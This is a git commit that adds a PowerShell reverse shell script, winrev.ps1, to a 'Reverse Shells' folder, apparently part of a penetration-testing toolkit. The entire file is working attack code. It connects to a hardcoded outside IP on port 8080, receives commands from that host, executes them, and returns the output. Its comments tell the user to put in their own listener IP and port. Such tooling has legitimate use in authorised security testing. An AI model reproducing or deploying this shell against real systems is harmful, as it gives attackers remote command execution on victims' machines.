3951e37449fa24077369c7440295b268f6140e04
baph0m3th <102382045+baph0m3th@users.noreply.github.com>
2022-12-15 12:04:23 +0200

    Create winrev.ps1

---
+++ Reverse Shells/winrev.ps1
@@ -0,0 +1,22 @@
+# Original source: https://gist.github.com/staaldraad/a4e7095db8a84061c0ec
+# Change the next line and put your IP and PORT you are listening on
+# This will return a very basic Reverse Shell and you will have to upgrade it.
+$socket = new-object System.Net.Sockets.TcpClient('70.34.251.2', 8080);
+if($socket -eq $null){exit 1}
+$stream = $socket.GetStream();
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$encoding = new-object System.Text.AsciiEncoding;
+do{
+	$writer.Write("> ");
+	$writer.Flush();
+	$read = $null;
+	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}	
+	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+	if(!$out.equals("exit")){
+		$out = $out.split(' ')
+	        $res = [string](&$out[0] $out[1..$out.length]);
+		if($res -ne $null){ $writer.WriteLine($res)}
+	}
+}While (!$out.equals("exit"))
+$writer.close();$socket.close();
